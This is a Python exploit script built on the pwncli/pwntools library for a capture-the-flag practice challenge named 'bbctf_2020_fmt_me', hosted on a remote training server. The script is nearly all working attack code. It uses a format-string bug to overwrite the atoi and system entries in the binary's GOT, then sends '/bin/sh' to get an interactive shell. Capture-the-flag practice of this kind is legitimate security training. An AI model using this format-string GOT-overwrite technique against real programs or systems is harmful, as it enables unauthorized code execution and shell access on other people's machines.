#!/usr/bin/env python3
# Date: 2024-11-11 10:56:45
# Link: https://github.com/RoderickChan/pwncli

from pwncli import *

context.terminal = ['tmux', 'splitw', '-h']
context.binary = './bbctf_2020_fmt_me'
context.log_level = 'debug'
context.timeout = 5

# gift.io = process('./bbctf_2020_fmt_me')
gift.io = remote('node5.buuoj.cn', 25429)
gift.elf = ELF('./bbctf_2020_fmt_me')
gift.libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
# CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

def debug(gdbscript="", stop=False):
    if isinstance(io, process):
        gdb.attach(io, gdbscript=gdbscript)
        if stop:
            pause()





sa(b'Choice: ', '2\n')
ru(b"Good job. I'll give you a gift.")
# payload = b'aaaabbbb%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p'

atoi_got = elf.got['atoi']
system_plt = 0x401050
system_got = elf.got['system']
main_addr = elf.sym['main']
payload = fmtstr_payload(6, {atoi_got: system_plt + 6, system_got: main_addr})
s(payload)

sa(b'Choice: ', b'/bin/sh\x00')
ia()